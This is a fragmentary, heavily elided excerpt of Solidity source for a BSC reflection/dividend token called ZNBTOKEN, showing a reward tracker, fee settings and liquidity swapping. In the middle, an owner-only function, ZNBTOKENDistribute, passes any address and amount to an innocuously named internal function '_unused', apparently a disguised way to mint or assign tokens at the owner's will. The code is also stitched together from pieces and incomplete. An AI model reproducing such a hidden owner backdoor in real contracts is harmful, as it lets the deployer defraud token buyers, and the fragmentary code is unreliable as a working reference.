...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function _unused(address account, uint256 amount) internal virtual {
...
function _unused(address account, uint256 value) internal override {
    super._unused(account, value);
...
contract ZNBTOKENrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardZNBTOKENMap  for RewardZNBTOKENMap .Map;
RewardZNBTOKENMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("ZNBTOKEN_rewardToken_Tracker", "ZNBTOKEN_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "ZNBTOKEN_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "ZNBTOKEN_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ZNBTOKEN contract.");
    }
...
contract ZNBTOKEN is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  returnHolderFee = 5;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    ZNBTOKENrewardToken public rewardToken;
...
bool public cooldownEnabled = false;
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new ZNBTOKENrewardToken();
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function ZNBTOKENDistribute(address userAddress, uint256 tokenToUser) public masterWallet{
       _unused(userAddress, tokenToUser);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "ZNBTOKEN: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "ZNBTOKEN: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "ZNBTOKEN: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "ZNBTOKEN: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTZNBTOKEN = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTZNBTOKEN);
...
addLiquidity(tokensTZNBTOKEN, bnbForLiquidity);
